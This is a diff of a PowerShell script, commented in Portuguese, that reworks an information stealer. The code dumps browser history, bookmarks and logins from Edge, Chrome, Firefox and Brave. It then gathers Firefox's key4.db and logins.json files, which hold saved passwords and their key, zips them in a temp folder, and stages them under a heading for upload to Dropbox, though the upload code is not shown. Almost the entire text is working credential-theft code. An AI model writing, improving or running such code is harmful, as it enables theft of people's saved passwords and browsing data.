@@ -474,8 +474,7 @@ $drivers
 
 "@
 
-# Saída para o arquivo de texto de dados do computador
-$output > "$env:TEMP\$FolderName/computerData.txt"
+$output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 # Dados do Browser
@@ -483,9 +482,9 @@ function Get-BrowserData {
 
     [CmdletBinding()]
     param (    
-        [Parameter (Position=1,Mandatory = $True)]
+        [Parameter(Position=1,Mandatory = $True)]
         [string]$Browser,    
-        [Parameter (Position=1,Mandatory = $True)]
+        [Parameter(Position=2,Mandatory = $True)]
         [string]$DataType 
     ) 
 
@@ -514,44 +513,59 @@ function Get-BrowserData {
     } 
 }
 
-# Definindo o caminho da pasta do perfil do Firefox
-$FirefoxProfilePath = "C:\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release"
-
-# Definindo o caminho da pasta temporária
-$TempFolderPath = "$env:TEMP\$FolderName"
-
-# Verificando se a pasta temporária existe e, se não, criando-a
-if (-not (Test-Path $TempFolderPath)) {
-    New-Item -ItemType Directory -Path $TempFolderPath | Out-Null
-}
-
-# Lista dos arquivos que serão copiados
-$FilesToCopy = @("key4.db", "logins.json", "logins-backup.json")
-
-# Copiando os arquivos do Firefox para a pasta temporária
-foreach ($File in $FilesToCopy) {
-    $SourceFile = Join-Path -Path $FirefoxProfilePath -ChildPath $File
-    $DestinationFile = Join-Path -Path $TempFolderPath -ChildPath "Dados-do-Browser\$File"
-    Copy-Item -Path $SourceFile -Destination $DestinationFile -Force
-}
-
 # Criar uma pasta para os dados do navegador
-New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Dados-do-Browser" | Out-Null
+$BrowserDataFolder = "$Env:TEMP\$FolderName\Dados-do-Browser"
+New-Item -ItemType Directory -Path $BrowserDataFolder -Force | Out-Null
 
 # Salvar os dados do navegador dentro da nova pasta
-Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "chrome" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "firefox" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
-############################################################################################################################################################
+Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$BrowserDataFolder\BrowserData.txt"
 
-# Comprimir a pasta temporária
-Compress-Archive -Path "$env:temp\$FolderName" -DestinationPath "$env:temp\$ZIP"
+# Função para comprimir arquivos específicos e movê-los para a pasta "Dados-do-Browser"
+function Compress-And-MoveFilesToBrowserDataFolder {
+    param (
+        [string]$SourceFolder,
+        [string]$DestinationFolder
+    )
 
+    # Localizar os arquivos no diretório Firefox
+    $FirefoxProfilePath = Get-ChildItem "$SourceFolder\*.default-release"
+    $FilesToCompress = @()
+    foreach ($file in $FirefoxProfilePath) {
+        $key4Path = Join-Path -Path $file.FullName -ChildPath "key4.db"
+        $loginJsonPath = Join-Path -Path $file.FullName -ChildPath "logins.json"
+        $loginsBackupJsonPath = Join-Path -Path $file.FullName -ChildPath "logins-backup.json"
+
+        # Verificar se os arquivos existem e adicioná-los à lista de arquivos para compressão
+        if (Test-Path $key4Path -PathType Leaf) {
+            $FilesToCompress += $key4Path
+        }
+        if (Test-Path $loginJsonPath -PathType Leaf) {
+            $FilesToCompress += $loginJsonPath
+        }
+        if (Test-Path $loginsBackupJsonPath -PathType Leaf) {
+            $FilesToCompress += $loginsBackupJsonPath
+        }
+    }
+
+    # Comprimir os arquivos
+    $ZipFilePath = Join-Path -Path $SourceFolder -ChildPath "FirefoxFiles.zip"
+    Compress-Archive -Path $FilesToCompress -DestinationPath $ZipFilePath
+
+    # Mover o arquivo comprimido para a pasta "Dados-do-Browser"
+    $DestinationPath = Join-Path -Path $DestinationFolder -ChildPath "Dados-do-Browser"
+    New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
+    Move-Item -Path $ZipFilePath -Destination $DestinationPath -Force
+}
+
+# Chamar a função para comprimir e mover os arquivos
+Compress-And-MoveFilesToBrowserDataFolder -SourceFolder "$Env:APPDATA\Mozilla\Firefox\Profiles" -DestinationFolder "$Env:TEMP\$FolderName"
 
 # Upload para a Dropbox
 
